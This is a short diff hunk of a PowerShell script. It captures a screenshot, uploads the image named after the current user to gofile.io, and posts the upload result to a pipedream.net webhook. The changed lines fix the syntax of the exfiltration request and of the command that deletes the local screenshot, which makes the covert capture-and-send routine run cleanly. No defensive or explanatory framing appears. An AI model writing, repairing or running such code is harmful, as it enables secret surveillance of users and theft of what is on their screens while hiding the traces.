@@ -30,5 +30,5 @@ $graphics.Dispose()
 $bmp.Dispose()
 
 $hi = cmd /c curl -X POST 'https://store1.gofile.io/contents/uploadfile' -F "file=@$env:username.png"
-curl https://eov3z188nwj4lcz.m.pipedream.net/screenshot/$env:username" -Body $hi -method post
-Remove-Item "c:\Cache\".$env:username.".png"
+curl "https://eov3z188nwj4lcz.m.pipedream.net/screenshot/$env:username" -Body $hi -method post
+Remove-Item "c:\Cache\$env:username.png"
